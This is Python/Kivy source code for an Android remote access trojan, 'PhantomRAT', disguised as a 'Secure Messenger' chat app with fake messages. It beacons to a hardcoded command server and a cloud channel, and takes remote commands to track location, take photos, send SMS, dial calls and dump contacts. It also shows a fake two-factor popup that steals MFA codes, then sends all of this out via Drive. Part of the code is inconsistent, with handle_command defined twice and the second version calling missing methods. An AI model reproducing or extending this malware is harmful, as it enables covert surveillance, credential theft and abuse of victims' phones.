import kivy
kivy.require('2.3.0')

from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.metrics import dp
from kivy.clock import Clock
from plyer import gps, camera, vibrator, sms, call, notification, battery, accelerometer, gyroscope, brightness
from plyer.utils import platform
import json
import base64
import requests
from cryptography.fernet import Fernet
import time
import random
import os
from phantomrat_cloud import exfil_via_drive, fetch_task

# Load profile
with open('malleable_profile.json', 'r') as f:
    profile = json.load(f)

key = profile['encryption']['key'].encode()
fernet = Fernet(base64.urlsafe_b64encode(key.ljust(32)[:32]))

def encrypt_data(data):
    return fernet.encrypt(json.dumps(data).encode()).decode()

def decrypt_data(data):
    return json.loads(fernet.decrypt(data.encode()).decode())

c2_url = "http://141.105.71.196"

class PhantomRATApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(10))

        # Chat history scroll view
        self.scroll = ScrollView(size_hint=(1, 0.8))
        self.chat_layout = BoxLayout(orientation='vertical', size_hint_y=None)
        self.chat_layout.bind(minimum_height=self.chat_layout.setter('height'))
        self.scroll.add_widget(self.chat_layout)

        # Input area
        self.input_layout = BoxLayout(size_hint=(1, 0.2), spacing=dp(5))
        self.text_input = TextInput(hint_text='Type a message...', multiline=False)
        self.send_button = Button(text='Send', size_hint_x=0.3)
        self.send_button.bind(on_press=self.send_message)
        self.input_layout.add_widget(self.text_input)
        self.input_layout.add_widget(self.send_button)

        self.layout.add_widget(self.scroll)
        self.layout.add_widget(self.input_layout)

        # Add initial messages to look like a chat
        self.add_message('System: Welcome to Secure Messenger!')
        self.add_message('Friend: Hey, how are you?')
        self.add_message('You: Doing great, thanks!')

        Clock.schedule_interval(self.beacon, profile['sleep'])
        self.schedule_random_ping()
        return self.layout

    def add_message(self, text):
        msg_label = Label(text=text, size_hint_y=None, height=dp(30), halign='left', valign='top')
        msg_label.bind(size=msg_label.setter('text_size'))
        self.chat_layout.add_widget(msg_label)
        self.scroll.scroll_to(msg_label)

    def send_message(self, instance):
        text = self.text_input.text.strip()
        if text:
            self.add_message(f'You: {text}')
            self.text_input.text = ''
            # Simulate response
            Clock.schedule_once(lambda dt: self.add_message('Friend: Got it!'), 1)

    def schedule_random_ping(self):
        interval = random.randint(60, 300)  # 1-5 minutes
        Clock.schedule_once(self.status_ping, interval)

    def status_ping(self, dt):
        # AI-shaped: only ping if screen is on or accelerometer detects activity
        if brightness.current > 0 or accelerometer.acceleration[0] > 0.1:  # Rough activity detection
            status = {
                "alive": True,
                "environment": {"platform": platform, "battery": battery.status},
                "payloads_deployed": ["location", "camera", "sms", "contacts"],
                "control_level": "full"
            }
            self.exfil_data(status)
        self.schedule_random_ping()

    def beacon(self, dt):
        jitter = random.randint(-profile['jitter'], profile['jitter'])
        time.sleep(abs(jitter))
        try:
            # Fetch task from cloud
            task = fetch_task()
            self.handle_command(task)
        except:
            pass

    def handle_command(self, cmd):
        if 'cmd' in cmd:
            if cmd['cmd'] == 'notification':
                notification.notify(title='Secure Messenger', message=cmd.get('message', 'New message'))
            elif cmd['cmd'] == 'mfa_prompt':
                self.show_mfa_prompt()
            elif cmd['cmd'] == 'get_location':
                gps.configure(on_location=self.on_location)
                gps.start()
            elif cmd['cmd'] == 'take_photo':
                camera.take_picture('/sdcard/photo.jpg', on_complete=self.on_photo)
            elif cmd['cmd'] == 'send_sms':
                sms.send(recipient=cmd['recipient'], message=cmd['message'])
            elif cmd['cmd'] == 'vibrate':
                vibrator.vibrate(1)
            elif cmd['cmd'] == 'call':
                call.dial(cmd['number'])
            elif cmd['cmd'] == 'exfil':
                self.exfil_data(cmd['data'])
            elif cmd['cmd'] == 'record_audio':
                # Plyer has audio, but simple
                pass  # Implement if possible
            elif cmd['cmd'] == 'get_contacts':
                # Plyer contacts
                from plyer import contacts
                contacts_list = contacts.get_all_contacts()
                self.exfil_data({'contacts': contacts_list})
            elif cmd['cmd'] == 'battery_status':
                batt = battery.status
                self.exfil_data({'battery': batt})
            elif cmd['cmd'] == 'accelerometer':
                accel = accelerometer.acceleration
                self.exfil_data({'accel': accel})

    def on_location(self, **kwargs):
        loc = {'lat': kwargs['lat'], 'lon': kwargs['lon']}
        self.exfil_data(loc)

    def on_photo(self, path):
        with open(path, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        self.exfil_data({'photo': data})

    def exfil_data(self, data):
        exfil_via_drive(data)

    def handle_command(self, task):
        if 'cmd' in task:
            cmd = task['cmd']
            if cmd == 'location':
                self.get_location()
            elif cmd == 'camera':
                self.capture_photo()
            elif cmd == 'sms':
                self.send_sms(task.get('number'), task.get('message'))
            elif cmd == 'contacts':
                self.dump_contacts()
            # Add more
        # Exfil response
        self.exfil_data({'response': 'command executed'})

    def show_mfa_prompt(self):
        # Simulate MFA prompt to capture token
        from kivy.uix.popup import Popup
        from kivy.uix.textinput import TextInput
        from kivy.uix.button import Button
        from kivy.uix.boxlayout import BoxLayout

        layout = BoxLayout(orientation='vertical')
        label = Label(text='Enter your MFA code:')
        text_input = TextInput(multiline=False)
        button = Button(text='Submit')
        layout.add_widget(label)
        layout.add_widget(text_input)
        layout.add_widget(button)

        popup = Popup(title='Two-Factor Authentication', content=layout, size_hint=(0.8, 0.4))
        button.bind(on_press=lambda instance: self.capture_mfa(text_input.text, popup))
        popup.open()

    def capture_mfa(self, code, popup):
        popup.dismiss()
        self.exfil_data({'mfa_code': code})

if __name__ == '__main__':
    PhantomRATApp().run()